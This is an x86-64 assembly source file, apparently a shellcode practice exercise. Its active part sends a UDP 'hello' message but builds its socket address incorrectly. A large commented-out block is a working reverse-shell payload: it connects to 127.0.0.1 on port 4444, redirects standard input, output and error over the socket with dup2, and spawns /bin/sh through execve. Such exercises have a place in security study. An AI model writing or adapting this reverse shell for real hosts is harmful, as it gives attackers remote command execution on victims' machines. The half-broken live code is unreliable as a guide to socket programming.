;Author : Krash

; Notes:
; http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
;----------------- Assembly code -------------------

  
global main

section .data
    message db 'hello'
    sock    dw 2
            db 10h , 00h 
            db 7fh, 0h, 0h, 01h
            db 0,0,0,0,0,0,0,0


section .text
       

main:

        mov rax, 41                                ;Create Socket
        mov rdi, 2                                 ;AF_INET
        mov rsi, 2                                 ;Sock_DGRAM
        mov rdx, 0                                 ;flags
        syscall                                    ;CALL SYSCALL CREATE SOCKET ; Looks good!

        
        mov rdi, rax                            ; sockfd
        mov rax, 44                             ; Send Syscall
        mov rsi, message                        ; Have RDI point to that message buffer
        mov rdx, 0x5                            ; AF_INET

        push 0x00
        push qword 0xaaaaaaaaa
       ;push 0x0x68732f6e69622f2f
        mov r8, rsp
        mov r9, 16
        syscall







    ; Set up for TCP Session    

;         ;7F 00 00 01
;         push 0x0100007F
;         push word 0x5c11                        ; Port (4444)
;         push word 2                             ; Address family -


;         push 42                                 ; connect syscall
;         push byte 16                            ; length
;         push byte 41                            ; socket syscall
;         push byte 1                             ; type - SOCK_STREAM (0x1)
;         push byte 2                             ; family - AF_INET (0x2)

;         pop rdi                                 ; family
;         pop rsi                                 ; type
;         xor rdx, rdx                            ; protocol
;         pop rax                                 ; socket syscall
;         syscall

;         mov rdi, rax                            ; sockfd
;         pop rdx                                 ; length
;         pop rax                                 ; connect syscall
;         mov rsi, rsp                            ; sockaddr
;         syscall

;         xor rsi, rsi
; loop:
;         mov al, 33
;         syscall
;         inc rsi
;         cmp rsi, 2
;         jle loop

;         xor rax, rax
;         mov rdi, 0x68732f6e69622f2f
;         xor rsi, rsi
;         push rsi
;         push rdi
;         mov rdi, rsp
;         xor rdx, rdx
;         mov al, 59
;         syscall